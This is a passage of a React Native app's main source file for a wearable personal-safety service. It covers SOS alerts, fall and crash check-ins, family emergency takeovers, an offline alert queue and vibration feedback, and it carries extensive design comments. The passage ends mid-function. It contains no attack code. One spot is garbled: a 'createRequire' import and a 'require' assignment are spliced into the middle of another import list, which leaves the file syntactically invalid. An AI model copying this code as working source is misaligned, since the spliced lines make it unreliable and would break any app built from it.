import { StatusBar } from 'expo-status-bar';
import React, { useCallback, useEffect, useRef, useState } from 'react';
import {
  ActivityIndicator, AppState, Linking, Modal, Pressable, StyleSheet, Text,
  Vibration, View,
} from 'react-native';
import {
  ALERT_TIMEOUT, call, clearSession, loadSession, optinSamaritan, saveBandPin,
  saveSession, useLive,
} from './src/api';

import { clearQueue, dequeue, enqueue, flushQueue, pendingCount, pressId } from './src/alertQueue';
import { MODES, useBandLink } from './src/bandLink';
import BigNotice from './src/components/BigNotice';
import CheckinBanner from './src/components/CheckinBanner';
import FallCountdown, { FALL_WINDOW_S } from './src/components/FallCountdown';
import SamaritanCall from './src/components/SamaritanCall';
import { useAppFonts } from './src/fonts';
import Alerts from './src/screens/Alerts';
import Auth from './src/screens/Auth';
import Band from './src/screens/Band';
import Family from './src/screens/Family';
import Home from './src/screens/Home';
import LiveMap from './src/screens/LiveMap';
import Setup from './src/screens/Setup';
import UserShell from './src/screens/UserShell';
import DisarmPad from './src/screens/user/DisarmPad';
import { U } from './src/screens/user/kit';
import { SafeAreaRoot, useEdgeInsets } from './src/safeArea';
import { bandEventToAction, useSafetyMachine } from './src/state';
import { C, S, T, fmtAgo, sevColor } from './src/theme';
import { Button, Chip, Icon, IconButton, Txt } from './src/ui';
import { lastKnownFix, useHeartbeat, usePhoneBattery, usePresence } from './src/watch';
import {
  INCIDENT_WINDOW_S, classifyImpact, describeImpact, noteImpact, speedContext,
  travellingSteadily, useSpeedWatch,
} from './src/motion';
import { stopBackgroundWatch, syncBackgroundWatch } from './src/bgService';
import {
  adoptTracking, startTracking, stopTracking, trackAfterStandDown,
} from './src/liveLocation';
import { wantsBand } from './src/band';
import {
  registerBackgroundNotifications, unregisterBackgroundNotifications,
} from './src/bgNotifications';
import { activeAlarm, consumeLaunchAlertId, presentAlarm, stopAlarm } from './src/alarm';
import {
  // consumePendingBandSos, startBandWake and subscribeBandSos are not imported
  // while the band's beacon wake is switched off -- see the commented-out
  // effects below and docs/BAND_WAKE_DISABLED.md. `stopBandWake` stays, and is
  // the one thing still called: it disarms a phone updating from a build that
  // had the feature on.
  stopBandWake,
} from './src/bandWake';
import { runFirstRunAsks } from './src/permissions';
import {
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

  DEFAULT_CHANNEL_ID, clearOwnSosNotification, registerPushToken,
  sendEmergencyAlarmIfNothingShown, setupNotificationChannels,
  showOwnSosNotification, stopPushToThisPhone, subscribeNotificationTaps,
} from './src/notifications';

const TABS = [
  ['home',   'Home',   'home'],
  ['band',   'Band',   'watch'],
  ['family', 'Family', 'users'],
  ['alerts', 'Alerts', 'bell'],
  ['setup',  'Setup',  'settings'],
];

/** The kinds that put an emergency on screen and into the offline queue. */
const EMERGENCY_KINDS = ['sos', 'snatch', 'fall', 'accident'];

const TAKEOVER_TITLE = {
  sos: 'SOS', snatch: 'BAND TORN OFF', fall: 'FALL DETECTED',
  accident: 'ROAD ACCIDENT',
  // Not "watch stopped reporting". That reads as a gadget fault, and a family
  // triages it like one; the fact worth acting on is that the phone went quiet
  // *while armed*, which is the state where silence is the signal.
  checkin_missed: 'MISSED CHECK-IN', watch_lost: 'WENT QUIET WHILE ARMED',
  going_dark: 'PHONE ABOUT TO DIE',
};

// The one line under the name, for the kinds where the heading alone does not
// say what has actually happened. An emergency needs none of this -- "SOS" and
// a name is the whole message -- so only the quiet three are listed.
const TAKEOVER_LEDE = {
  watch_lost: 'Their watch stopped reporting while it was armed.',
  checkin_missed: 'They were asked if they were okay and did not answer.',
  going_dark: 'Their phone will stop reporting when the battery goes.',
};

// What reaches the family as a full-screen takeover rather than a line in a
// list. Severity 4 and up is an emergency and brings the siren with it;
// severity 3 -- a missed check-in, a watch that went quiet, a phone about to
// die -- takes the screen without one.
//
// Three used to be the level that got a notification and nothing else, which
// is why a family member whose relative's watch went quiet found out only if
// they happened to look at the shade. Silence *is* the alert for these kinds;
// delivering it more quietly than every other kind was exactly backwards.
const TAKEOVER_FROM = 3;
const SIREN_FROM = 4;

// Above this severity the Good Samaritan fan-out is available at all. It
// mirrors the server's own `sev >= 5` in services/alerts.py: a fall is a
// family matter, a snatch or a crash is one where the nearest stranger is the
// useful responder.
const SAMARITAN_FROM = 5;

// How old a live fix may be before the screen stops calling it live.
//
// Three missed fast pings, or one missed slow one. Past that the pin is
// described as what it is -- a last known position -- because "where they are"
// over a six-minute-old dot is the single most dangerous sentence this app
// could put in front of somebody who is driving. Mirrors LIVE_FIX_STALE_S in
// server/config.py.
const LIVE_STALE_S = 45;

// Battery thresholds, from the acceptance matrix: 20 % tells the family, 5 %
// says the phone is about to stop being a safety device at all.
const BATT_LOW = 20;
const BATT_DARK = 5;

// Hysteresis on the re-arm, so a level sitting exactly on a threshold cannot
// page the family twice. Mirrors virtualBand.js, which has always had it.
const BATT_REARM = 3;

// The band's reading needs more than hysteresis. DEVELOPMENT_PLAN F2.3 records
// consecutive heartbeats alternating between 93% and 39% on one board, on one
// continuous `seq`: the divider's source impedance (~338k) is far too high for
// the SAADC's default acquisition window, so each conversion is dragged toward
// the previous one, and averaging 8 back-to-back reads does not help because
// every sample is equally under-settled.
//
// No hysteresis band survives a 54-point swing. Requiring N consecutive
// readings on the same side does -- an alternating signal never produces two
// in a row. This is a workaround for a firmware defect, not a fix; the fix is
// F2.3 (longer acquisition time, or median-of-N with a gap between samples).
const BAND_LOW_STREAK = 3;

// What the phone vibrates when a press finally has an answer. Mirrors the band
// patterns in nigehban_band_nrf52.ino, deliberately: one fact, two outputs.
//
// Short and soft, and NOT the old [0, 300, 120, 300]. Two 300 ms buzzes against
// a hard surface -- a table, a bag with a laptop in it -- carry across a quiet
// room, and the wearer may be hiding from whoever they pressed the button
// about. That is the same reasoning that already keeps the wearer's own SOS
// notification silent; see notifications.js. Felt in a pocket, not heard across
// a room.
//
// `delivered` has two shapes, chosen by what was confirmed. An SOS reaching the
// family is the confirmation a frightened person is actually waiting for, so it
// is a single firm buzz, longer than anything the check-in path produces and
// recognisable without counting. A check-in answered is routine good news.
//
// `failed` is two long heavy buzzes rather than one. A single buzz means
// "sent", so failure must not also be a single buzz — telling 400 ms from
// 900 ms apart under stress is the most dangerous distinction in this
// vocabulary. Repetition carries it instead: one buzz is a full stop, two heavy
// ones are insistent.
const OUTCOME_BUZZ = {
  delivered_sos: [0, 400],
  delivered:     [0, 90, 70, 90],
  queued:        [0, 250, 150, 250, 150, 250],
  failed:        [0, 700, 300, 700],
};

// Local notifications are best-effort: Expo Go on Android has limits, and a
// demo cannot hinge on the notification shade. The in-app takeover below is
// the real signal; a notification is a bonus when the app is backgrounded.
let Notifications = null;
try {
  Notifications = require('expo-notifications');
  Notifications.setNotificationHandler({
    handleNotification: async () => ({
      shouldShowBanner: true, shouldShowList: true,
      shouldPlaySound: true, shouldSetBadge: false,
    }),
  });
} catch { /* not available; in-app alerts still work */ }

async function notify(title, body) {
  if (!Notifications) return;
  try {
    const p = await Notifications.getPermissionsAsync();
    if (!p.granted) {
      const r = await Notifications.requestPermissionsAsync();
      if (!r.granted) return;
    }
    await Notifications.scheduleNotificationAsync({
      content: { title, body, sound: true },
      // Same reason as the emergency channel: setupNotificationChannels creates
      // this one with the check-in vibration pattern, and the channel is picked
      // by the trigger. `trigger: null` quietly used Android's own default.
      trigger: { channelId: DEFAULT_CHANNEL_ID },
    });
  } catch { /* best effort */ }
}

/**
 * The same, but only when nobody is looking at the app.
 *
 * For anything that also has a screen of its own -- a BigNotice, the takeover
 * -- a shade banner posted while that screen is up is the same fact twice,
 * one of them drawn on top of the other. This is for the other half: the
 * phone in a pocket, where the notification is the only delivery there is.
 */
async function notifyIfAway(title, body) {
  if (AppState.currentState === 'active') return;
  await notify(title, body);
}

function Main() {
  const [booting, setBooting] = useState(true);
  const [session, setSession] = useState(null);
  const [tab, setTab] = useState('home');
  const [refreshKey, setRefreshKey] = useState(0);

  const [incoming, setIncoming] = useState(null);     // family emergency takeover
  const [acking, setAcking] = useState(false);        // "I'm on it", mid-flight
  // The family's Good Samaritan decision, mid-flight. Its own flag rather than
  // `acking`: both buttons live on the takeover and pressing one must not make
  // the other look like it is working.
  const [optingIn, setOptingIn] = useState(false);
  // The alert whose live map is open, or null. Its own state rather than a
  // flag on `incoming`, because the map outlives the takeover: dismissing the
  // emergency screen to look at a road should not close the road.
  const [liveMap, setLiveMap] = useState(null);
  const [askSheet, setAskSheet] = useState(null);     // the check-in question
  const [samaritan, setSamaritan] = useState(null);   // a stranger nearby
  const [deliveredTo, setDeliveredTo] = useState(null);
  const [deliveryStatus, setDeliveryStatus] = useState(null); // null | 'queued' | 'sending' | 'delivered'
  const [toast, setToast] = useState(null);
  // The queue behind BigNotice: news that is not an emergency but is still
  // somebody's answer -- a check-in answered, a responder on the way, an alert
  // stood down. Only the head is on screen; see `pushNotice` below.
  const [notices, setNotices] = useState([]);
  const [fix, setFix] = useState(null);               // last position, from Home
  const [pendingAlertId, setPendingAlertId] = useState(null); // { id, answered } from a notification

  const { state, ctx, dispatch, is, watchMode } = useSafetyMachine();
  const insets = useEdgeInsets();
  const bump = useCallback(() => setRefreshKey((k) => k + 1), []);

  /**
   * The sheet cannot outlive the question.
   *
   * `askSheet` is a copy of `ctx.checkin` that the modal renders from, and the
   * two are set together at every point a question arrives. They were only ever
   * torn down together at the points that existed when the sheet was written --
   * and the list of ways a question can close has been growing ever since:
   * answering it, a stand-down, an SOS ending, the server closing it because
   * "I am safe" answered it. Each new one is another chance to clear the state
   * machine's copy and leave a modal on screen asking a question that no longer
   * exists, which is how somebody who has just said they are safe gets asked,
   * a second later, whether they are safe.
   *
   * One effect instead of a `setAskSheet(null)` at every route out. Close only,
   * never open: "Not now" deliberately drops the sheet while leaving the
   * question open, and reopening it a frame later would take that away.
   */
  useEffect(() => { if (!ctx.checkin) setAskSheet(null); }, [ctx.checkin]);

  /**
   * Put one piece of news on the screen, big, and leave it there.
   *
   * Appends rather than replaces. Two of these can land within a second of
   * each other -- two family members both answering the same SOS -- and the
   * second overwriting the first would mean one of them was never told about
   * at all. Only the head renders; dismissing it brings the next.
   *
   * Keyed so that the *same* news arriving twice (a socket frame and its
   * push, or a reconnect replaying a frame) does not queue two identical
   * popups to dismiss one after the other.
   */
  const pushNotice = useCallback((notice) => {
    const key = notice.key || `${notice.icon}:${notice.title}`;
    setNotices((q) => (q.some((n) => n.key === key) ? q : [...q, { ...notice, key }]));
  }, []);

  const dismissNotice = useCallback(() => setNotices((q) => q.slice(1)), []);

  /**
   * How many people are waiting on an answer from this phone.
   *
   * Only the admin console needs it up here, and only admins pay for it: its
   * Family tab is where a request is answered, and a tab with nothing on it is
   * indistinguishable from a tab with somebody's question behind it. The user
   * shell counts its own, from the list its board is already loading -- one
   * more request on every socket frame, for a number somebody else has, is
   * exactly the kind of cost this app should not be paying during an
   * emergency.
   *
   * Re-read on `refreshKey`, which every arriving invite bumps, and again by
   * hand when the Family tab answers one -- answering there is a round trip
   * this component never hears about otherwise, and a dot that outlives the
   * question it was about is worse than no dot at all. A failure leaves the
   * old count: the tab still opens, the request is still in the list behind
   * it, and a mark this small is not worth an error message.
   */
  const [pendingInvites, setPendingInvites] = useState(0);
  // Which account the in-flight read belongs to. Sign out while it is on the
  // wire and the answer that comes back is about somebody who is no longer
  // holding this phone.
  const invitesFor = useRef(null);
  const refreshInvites = useCallback(async () => {
    const who = session?.user_id || null;
    invitesFor.current = who;
    if (!session || session.role !== 'admin') { setPendingInvites(0); return; }
    try {
      const r = await call(session, '/invites');
      if (invitesFor.current === who) setPendingInvites(r?.incoming?.length || 0);
    } catch { /* the dot is the only casualty */ }
  }, [session]);

  useEffect(() => { refreshInvites(); }, [refreshInvites, refreshKey]);

  useEffect(() => {
    (async () => {
      await setupNotificationChannels();
      // If a full-screen intent is what put this app on screen, the alert it
      // was about is sitting in the launch intent. Read it before anything
      // else can replace the intent, and hand it to the same routing the
      // notification tap uses.
      const launched = await consumeLaunchAlertId();
      if (launched) setPendingAlertId(launched);
      const s = await loadSession();
      setSession(s);
      // The foreground service is no longer started here. Signing in is not
      // by itself a reason to hold a process alive; holding a band link or
      // being armed is. The effect below owns that and runs on this launch.
      setBooting(false);
    })();
  }, []);

  // The role lives on the server row, never on the phone.
  //
  // It is read once at sign-in and then cached alongside the token, so an
  // account promoted to admin in the database would otherwise keep the
  // end-user shell until somebody thought to sign out and back in. Re-read it
  // on every launch, and write the answer back so the next cold start is
  // already right even with no network.
  const [roleTick, setRoleTick] = useState(0);
  useEffect(() => {
    if (!session?.token) return undefined;
    let cancelled = false;
    (async () => {
      try {
        const who = await call(session, '/me');
        // Only an explicit role is allowed to change anything. A server that
        // does not send the field at all -- an older build, or one that has
        // not been restarted since this endpoint learned to return it -- is
        // saying nothing about the role, not saying "user", and treating the
        // two the same demotes an admin one tick after they sign in.
        const role = typeof who?.role === 'string' ? who.role : null;
        if (cancelled || !role || role === session.role) return;
        const next = { ...session, role };
        setSession(next);
        await saveSession(next);
      } catch { /* offline: the cached role stands */ }
    })();
    return () => { cancelled = true; };
  }, [session?.token, session?.url, session?.role, roleTick]);

  // Coming back to the app counts as a launch for this purpose. Somebody
  // changing a role in the database and then reaching for the phone should not
  // have to kill it first to see the difference.
  useEffect(() => {
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') setRoleTick((n) => n + 1);
    });
    return () => sub.remove();
  }, []);

  // Tapping the push is how a killed app is opened at all, so the tap has to
  // land on the alert rather than a bare Home screen. The listener can fire
  // before `session` is ready (cold start), so it only records which alert
  // was tapped; the effect below does the fetch once a session exists.
  //
  // A tap on the push body is never an answer -- only the alarm notification's
  // own I'M ON IT button is, and that arrives through consumeLaunchAlertId.
  useEffect(() => subscribeNotificationTaps(
    (id) => setPendingAlertId({ id, answered: false })
  ), []);

  // Coming back to the app is the other half of the launch read, and for a long
  // time it was missing.
  //
  // The read above runs once, at boot. But MainActivity is singleTask, so when
  // the app is merely backgrounded -- which it usually is, the family member
  // opened it this morning -- Android does not restart it. It hands the alarm
  // notification's intent to `onNewIntent` instead, and nothing was ever asking
  // for that. So the one gesture the notification exists for, pressing it,
  // brought the app to the front on whatever tab it was left on, with the siren
  // still sounding and no takeover anywhere: no name, no map, no way to answer.
  //
  // `activeAlarm` is the second question, for the person who reaches past the
  // notification and opens the app from its icon. Neither of those intents
  // carries an alert id; the siren itself is the only thing that knows.
  useEffect(() => {
    const sub = AppState.addEventListener('change', async (next) => {
      if (next !== 'active') return;
      const hit = (await consumeLaunchAlertId()) || (await activeAlarm());
      if (hit) setPendingAlertId(hit);
    });
    return () => sub.remove();
  }, []);

  useEffect(() => {
    if (!pendingAlertId) return;
    // No session to fetch the alert with. While booting that is only "not yet",
    // so wait; once boot is done it is final, and the id has to be dropped
    // rather than held -- a held id keeps the siren armed forever, because the
    // stop below refuses to fire while one is outstanding.
    if (!session) {
      if (!booting) setPendingAlertId(null);
      return;
    }
    const { id, answered } = pendingAlertId;
    (async () => {
      try {
        const list = await call(session, '/alerts?scope=incoming');
        const alert = list.find((a) => String(a.id) === String(id));
        if (alert && !alert.resolved_at) {
          setIncoming(alert);
          setTab('home');
          // They already said they were going -- on the notification, before the
          // app was even open. The takeover still comes up, because "who and
          // where" is the next thing they need, but the family is told now
          // rather than after a second press of a button they have pressed.
          if (answered) {
            try {
              await call(session, `/alert/${alert.id}/ack`, { method: 'POST' });
              bump();
            } catch { /* the socket tells them when it reconnects */ }
          }
        }
      } catch { /* the in-app takeover still works once the socket catches up */ }
      setPendingAlertId(null);
    })();
  }, [pendingAlertId, session, booting, bump]);

  // Ask for what the app needs at the point somebody has an account and is
  // looking at the screen -- not on a Setup tab they may never open. Two rungs,
  // once per install; runFirstRunAsks says what is deliberately left out of it
  // and who asks for those instead.
  useEffect(() => {
    if (!session?.token) return;
    runFirstRunAsks();
  }, [session?.token]);

  // Keyed on the session rather than done once at boot. Registering only on
  // mount meant somebody who had just signed in had no push token on the
  // server until they next launched the app -- so the first alert after
  // pairing, the one most likely to be a real test, reached nothing. It also
  // re-runs on a token change, which is when a rotated push token gets filed.
  useEffect(() => {
    if (!session?.token) return;
    registerPushToken(session);
    // The silent push that fires the lock-screen alarm is delivered to a task,
    // not to a listener, and an unregistered task is simply never run. Doing it
    // here rather than at boot means it is also re-registered for whoever signs
    // in next on a shared phone.
    registerBackgroundNotifications();
  }, [session?.token, session?.url]);

  // The one place the alarm is stopped.
  //
  // Every exit out of the takeover -- "I'M ON IT", "Dismiss", and the wearer
  // standing the alert down from their own phone -- ends by clearing
  // `incoming`, so hanging the stop off that rather than off each button is
  // what makes it impossible to add a fourth exit that leaves a siren running.
  //
  // It also fires on mount, which is deliberate: the alarm notification is
  // ongoing and survives the process, so an app killed mid-siren would come
  // back to a notification it no longer has any way to clear.
  //
  // But that mount fire must not silence the alarm that *opened* this app. The
  // lock-screen takeover launches us cold with the siren already sounding, and
  // `incoming` cannot be set yet -- the alert id still has to be read off the
  // launch intent, the session loaded, and the row fetched. Firing before all
  // of that killed the siren about a second in and left the takeover on screen
  // silent. So the stop waits until nothing is still on its way: `booting`
  // covers the intent read, `pendingAlertId` covers the fetch, and both clear
  // even when they find nothing, which is when there really is a stale siren
  // to cut.
  useEffect(() => {
    if (booting || pendingAlertId || incoming) return;
    stopAlarm();
  }, [incoming, pendingAlertId, booting]);

  useEffect(() => {
    if (!toast) return undefined;
    const t = setTimeout(() => setToast(null), 4500);
    return () => clearTimeout(t);
  }, [toast]);

  // ---- raising and standing down -----------------------------------------
  // The band, reachable from `raise` below, which is defined before the link
  // exists. A ref rather than a dependency because a buzz is fire-and-forget:
  // rebuilding `raise` every time the band's battery ticks would be a lot of
  // churn for a call that never reads anything back.
  const bandRef = useRef(null);

  // ---- telling the wearer what actually happened to their press ------------
  //
  // The band cannot answer this and must not pretend to. A successful write
  // over the GATT link means the *phone* received the press; whether the server
  // has it, and whether the family was paged, is known only here. With the
  // offline queue in between, an alert can be accepted by this phone and sit
  // unsent for minutes -- so a confirmation fired at dispatch time is a
  // confirmation of nothing.
  //
  // One helper, three outcomes, two channels. Both channels are driven from the
  // same event on purpose: two confirmations that can disagree are worse than
  // one, because a wearer with a buzzing wrist and a silent phone has no way to
  // reconcile them. Fired together they degrade gracefully instead -- phone in
  // a bag, you still feel the band; band flat or out of range, you still feel
  // the phone.
  //
  // See docs/BAND_FEEDBACK_SPEC.md. The band's side is `handleCommand` in
  // nigehban_band_nrf52.ino; the patterns are OUTCOME_BUZZ at the top of this
  // file.
  // `status` is 'delivered' | 'queued' | 'failed'; `kind` is 'sos' for an
  // emergency and anything else for the routine paths. The band is NOT told the
  // kind -- it sent the event, so it already knows what it is waiting to hear
  // about, and a protocol that carried it would be a second source of truth
  // able to disagree with the first. Only the phone's own buzz needs the hint.
  const reportOutcome = useCallback((status, kind) => {
    // `ack` is the firmware's own name for "cloud received our event". It has
    // existed in the protocol since the beginning and nothing had ever sent it.
    const cmd = status === 'delivered' ? 'ack' : status;
    try { bandRef.current?.send?.({ c: cmd }); } catch { /* no band, or link gone */ }

    const key = status === 'delivered' && kind === 'sos' ? 'delivered_sos' : status;
    try { Vibration.vibrate(OUTCOME_BUZZ[key] || OUTCOME_BUZZ.failed); } catch { /* no motor */ }
  }, []);

  const raise = useCallback(async (payload) => {
    if (!session) return null;

    // Capture the GPS fix at the moment the button is pressed — Point A.
    // This is where the emergency happened, not wherever the phone drifts
    // to while waiting for signal.
    const at = fix || await lastKnownFix();

    // The id of this press, minted here and not one line later. It goes out on
    // the FIRST attempt, which is the one that matters: the duplicate SOS came
    // from an attempt that reached the server, inserted the row and paged the
    // family, and then took longer to answer than the phone was willing to
    // wait. Every retry now carries the same id and the server recognises it.
    const clientId = pressId();
    const allowSamaritan = payload.allow_samaritan ?? payload.allowSamaritan ?? null;
    const body = {
      lat: at?.lat, lon: at?.lon, accuracy: at?.acc, client_id: clientId, ...payload,
      allow_samaritan: allowSamaritan,
    };
    // `accident` belongs here with the rest. Everything this flag gates --
    // the local-first dispatch, the sticky own-SOS notification, the
    // offline queue, the delivery outcome sent back to the wrist -- is
    // exactly what a crash alert needs, and leaving it out would make the
    // most serious event the detector can raise the only one that silently
    // fails to queue when there is no signal.
    const isEmergency = EMERGENCY_KINDS.includes(payload.kind);

    // LOCAL-FIRST: fire the state machine and vibrate immediately, before
    // the network call. The user must know their button press registered,
    // and the SOS screen must appear even with no connectivity at all.
    const localAlert = {
      id: `pending-${Date.now()}`,
      kind: payload.kind,
      source: payload.source || 'app',
      created_at: Date.now() / 1000,
      lat: at?.lat, lon: at?.lon,
      samaritan_status: allowSamaritan === true ? 'allowed' : (allowSamaritan === false ? 'denied' : 'pending'),
      _local: true,  // marker: not yet confirmed by the server
    };
    if (isEmergency) {
      dispatch('SOS_RAISED', { alert: localAlert });
      setDeliveredTo(null);
      setDeliveryStatus('queued');

      // ACKNOWLEDGEMENT, not confirmation. One short buzz meaning "this phone
      // heard you" -- nothing more, because nothing more is known yet.
      //
      // This used to be [0,300,120,300] plus a three-pulse band buzz, both
      // fired here, one line after deliveryStatus was set to 'queued' and
      // before the network call below had been attempted. The wearer was told
      // "SOS sent" twice, on two devices, at a moment when nothing had left the
      // phone -- and two channels agreeing reads as corroboration, which made
      // it worse than a single wrong signal rather than better.
      //
      // The real answer now goes out from the try/catch below, where it is
      // actually known. The band says nothing at all here: it already ticked
      // once per press, and it is waiting to be told.
      Vibration.vibrate([0, 90]);

      // The confirmations that do not need this screen to exist.
      //
      // When the band raises an SOS with the app swiped out of Recents, this
      // function still runs: the process is alive, the vibration is felt, and
      // the alert below reaches the server. Only the dispatch above is inert,
      // because the reducer it targets died with the activity. So the wrist and
      // the notification shade are where the wearer is actually told -- and
      // they are the two places that were saying nothing at all.
      showOwnSosNotification(localAlert);
    }

    // Now try the network call.
    try {
      const r = await call(session, '/alert', {
        method: 'POST', body, timeout: ALERT_TIMEOUT,
      });
      if (isEmergency) {
        // Replace the local placeholder with the real server alert.
        dispatch('SOS_RAISED', { alert: r.alert });
        setDeliveredTo(r.delivered_to);
        setDeliveryStatus('delivered');
        // And start reporting where she is, on the rhythm the SERVER asked
        // for. Only now, not at the local-first dispatch above: until this
        // reply there is no alert row for the fixes to belong to, and a
        // tracker started against a `pending-...` id would post positions the
        // server has nowhere to put. The fix the alert already carries covers
        // the seconds in between.
        if (r.tracking) startTracking(r.tracking).catch(() => { /* the bg tick retries */ });
        // The server has it. This is the first moment anything could honestly
        // say so, and it is the only place that says it.
        reportOutcome('delivered', 'sos');
      }
      if (payload.kind !== 'near_miss') {
        setToast(r.delivered_to
          ? `Sent to ${r.delivered_to} family member${r.delivered_to === 1 ? '' : 's'}`
          : 'Nobody is in your family list yet — add someone first');
      }
      bump();
      return r.alert;
    } catch (e) {
      if (isEmergency) {
        // Network failed — queue for retry. The SOS screen is already live
        // from the local-first dispatch above.
        //
        // The queue's own id becomes the alert's id from here on. Without that
        // the screen held a `pending-…` id with no way back to the row in
        // storage, so cancelling had nothing to aim at and cleared the entire
        // queue -- a queued fall plus a queued SOS meant standing down either
        // one silently threw away the other.
        const queuedId = await enqueue(body);
        dispatch('SOS_RAISED', { alert: { ...localAlert, id: queuedId } });
        setDeliveryStatus('queued');
        // Held, not delivered, and the wrist is told which. This is the case
        // the old confirmation hid completely: the alert is safe on the phone
        // and nobody has been paged, and the wearer used to feel exactly what
        // they felt when the family had already been called.
        reportOutcome('queued');
        setToast('No signal — your alert is saved and will send automatically when connection returns');
      } else {
        setToast(e.message);
      }
      return null;
    }
  }, [session, fix, dispatch, bump, reportOutcome]);

  const handleOptinSamaritan = useCallback(async (alertId, action) => {
    if (!session) return;
    try {
      const res = await optinSamaritan(session, alertId, action);
      dispatch('SAMARITAN_STATUS', {
        alertId,
        samaritan_status: res.samaritan_status,
        decided_by: res.decided_by,
      });
      setIncoming((cur) => {
        if (!cur || cur.id !== alertId) return cur;
        return {
          ...cur,
          samaritan_status: res.samaritan_status,
          samaritan_decided_by: res.decided_by,
        };
      });
      if (res.samaritan_status === 'allowed') {
        setToast('Broadcasted to nearby Good Samaritans within 800m');
      } else {
        setToast('Emergency set to Family Only');
      }
      bump();
    } catch (e) {
      setToast(e.message);
    }
  }, [session, dispatch, bump]);

  const resolve = useCallback(async (id) => {

    try {
      if (!id || String(id).startsWith('pending-') || String(id).startsWith('local-')) {
        // One item, not the lot. `local-…` is a real row in the queue and is
        // removed by id; `pending-…` never reached storage at all, so there is
        // nothing to remove and anything else waiting there belongs to a
        // different emergency.
        if (String(id).startsWith('local-')) await dequeue(id);
        dispatch('SOS_CLEARED');
        setDeliveredTo(null);
        setDeliveryStatus(null);
        clearOwnSosNotification();
        // Nothing had gone out, so nothing needs standing down at the server.
        // From the wrist's point of view the cancel still landed, which is what
        // the press was asking about.
        reportOutcome('delivered');
        setToast('Cancelled — alert was not sent yet');
        bump();
        return;
      }
      const r = await call(session, `/alert/${id}/resolve`, { method: 'POST' });
      dispatch('SOS_CLEARED');
      // Both, because this phone is not always in `sos_live` when it stands one
      // down. A fall that escalated on the SERVER never raised an alert here --
      // the machine is sitting in `checkin_pending` holding the fall's own
      // question, which `recoverOpenWork` put back on screen -- and SOS_CLEARED
      // is illegal there, so it is dropped and the question survives the
      // stand-down. In `sos_live` this one is the dropped event instead, and
      // SOS_CLEARED has already cleared the same field. Whichever state we are
      // in, exactly one of these lands and the question closes.
      dispatch('CHECKIN_CLOSED');
      setDeliveredTo(null);
      setDeliveryStatus(null);
      // The emergency is over; the journey is not. "I'm safe" gets pressed at
      // the roadside or at the top of a street she still has to walk down, and
      // the family keep seeing her move for the half hour the server just
      // granted -- slower, and on a notification that says so. `track_until`
      // is the server's number: the phone is not trusted to decide when to
      // stop reporting somebody's position.
      trackAfterStandDown(id, r?.track_until).catch(() => { /* bg tick retries */ });
      // The notification is sticky by design, so nothing else will ever take it
      // down. An "SOS is active" sitting on the lock screen after the wearer
      // stood it down is the same lie as the screen showing nothing during one.
      clearOwnSosNotification();
      reportOutcome('delivered');
      setToast('Stood down — your family has been told');
      bump();
    } catch (e) {
      // The family still believes this is live. That is worth a distinct
      // signal on the wrist, not just a toast: the wearer thinks they have
      // called off an emergency and they have not.
      reportOutcome('failed');
      setToast(e.message);
    }
  }, [session, dispatch, bump, reportOutcome]);

  const ackCheckin = useCallback(async (checkin) => {
    if (!session) return;
    setAskSheet(null);
    try {
      // Prefer the specific row. Falling back to a plain `checkin_ack` alert is
      // not a nicety: a buzz that arrived while the socket was down has no id
      // here, and the server closes every open question either way.
      if (checkin?.checkin_id) {
        await call(session, `/checkin/${checkin.checkin_id}/ack`, { method: 'POST' });
      } else {
        await call(session, '/alert', { method: 'POST', body: { kind: 'checkin_ack', source: 'app' } });
      }
      dispatch('CHECKIN_CLOSED');
      // "I'm fine" reached the server. The band has been waiting to hear this
      // since the press -- it stopped buzzing its own guess, because a
      // stand-down that never arrived used to feel identical to one that did.
      reportOutcome('delivered');
      setToast('Answered — your family can see you are fine');
      bump();
    } catch (e) {
      // A failed stand-down is the dangerous direction: the family is still
      // being told this person has not answered. Say so on the wrist rather
      // than only in a toast the wearer may never look at.
      reportOutcome('failed');
      setToast(e.message);
    }
  }, [session, dispatch, bump, reportOutcome]);

  const toggleHighAlert = useCallback(async (on) => {
    if (!session) return;
    try {
      const r = await call(session, '/watch/high_alert', { method: 'POST', body: { on } });
      dispatch('HIGH_ALERT_SET', { on, nextBuzzAt: r.next_buzz_at || null });
      setToast(on
        ? 'High Alert armed — the server checks on you even if this app is closed'
        : 'High Alert off');
      bump();
    } catch (e) {
      // Say what actually happened. A band that buzzed twice while the server
      // never heard is worse than a plain failure, because the wearer now
      // believes she is being watched.
      setToast(`Could not reach the server — High Alert is NOT ${on ? 'on' : 'off'}`);
    }
  }, [session, dispatch, bump]);

  /**
   * When the last incident question was opened, for the re-entrancy guard
   * inside openIncidentCheckin. A ref rather than state on purpose: it has to
   * be readable and writable in the same synchronous turn, which is exactly
   * what state cannot do.
   */
  const incidentAt = useRef(0);

  /**
   * A detector fired. Ask the wearer, and tell nobody.
   *
   * This is the whole of "a fall does not page your family". The question goes
   * to the SERVER, not to a timer in this process, because the situations this
   * exists for are the ones where this process is about to stop existing: the
   * phone lands screen-down in a gutter, the battery gives out, an OEM battery
   * manager kills the app the moment the screen goes off, the rider goes one
   * way and the phone the other. A local countdown in any of those is a
   * question asked, unanswered, and then silently dropped -- the exact failure
   * the product exists to prevent, arrived at quietly.
   *
   * Once `/checkin/self` has returned, the deadline is a row in the database
   * and the sweeper owns it. This phone can be destroyed in the next second and
   * the family is still told.
   *
   * The local countdown below is the OFFLINE path, and only that. With no
   * network there is no server to hold the deadline, so the phone holds it
   * itself and raises the alert into the offline queue if it runs out -- which
   * is worse (it dies with the app) and is still much better than nothing.
   */
  const openIncidentCheckin = useCallback(async (reason, ev) => {
    if (!session) return;
    if (stateRef.current === 'sos_live') return;   // already the worst case
    if (stateRef.current === 'fall_pending') return;  // one question per episode

    // The state guard above is not enough on its own, and the case it misses is
    // the normal one for a serious crash. Somebody thrown off a bike produces a
    // real free-fall AND a 20 g spike, so the band sends `fall` and `impact`
    // milliseconds apart -- and `stateRef` is only refreshed on render, so the
    // second one arrives before React has been anywhere near the first. Both
    // pass, and one accident becomes two questions, two rows and two
    // escalations to the same family.
    //
    // A timestamp read and written synchronously is what actually closes it.
    // The window matches the band's own IMPACT_REFRACTORY_MS: inside ten
    // seconds, everything the IMU reports is the same episode.
    const nowMs = Date.now();
    if (nowMs - incidentAt.current < 10000) return;
    incidentAt.current = nowMs;

    const at = fix || await lastKnownFix();
    const ctxNow = speedContext();
    const note = (describeImpact(ev, ctxNow)
                  + (ev?.ff_ms ? ` Free-fall lasted ${ev.ff_ms}ms.` : '')).trim();
